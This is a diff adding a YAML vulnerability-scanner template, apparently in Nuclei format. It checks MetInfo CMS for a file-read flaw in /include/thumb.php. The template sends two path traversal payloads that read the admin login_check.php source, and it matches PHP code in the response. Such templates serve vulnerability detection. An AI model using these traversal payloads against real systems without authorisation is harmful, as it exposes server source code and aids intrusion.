@@ -1,0 +1,29 @@
+id: yaml-poc-metinfo-metinfo-readfile-CT-158191
+info:
+  name: Yaml Poc Metinfo Metinfo Readfile Ct 158191
+  author: converted
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-metinfo-metinfo-readfile-CT-158191'
+  tags: lfi
+  reference: []
+http:
+- method: GET
+  path:
+  - /include/thumb.php?dir=http/.....///.....///admin/login/login_check.php
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - <?php
+    - login_met_cookie($metinfo_admin_name);
+- method: GET
+  path:
+  - /include/thumb.php?dir=http\..\admin\login\login_check.php
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - <?php
+    - login_met_cookie($metinfo_admin_name);
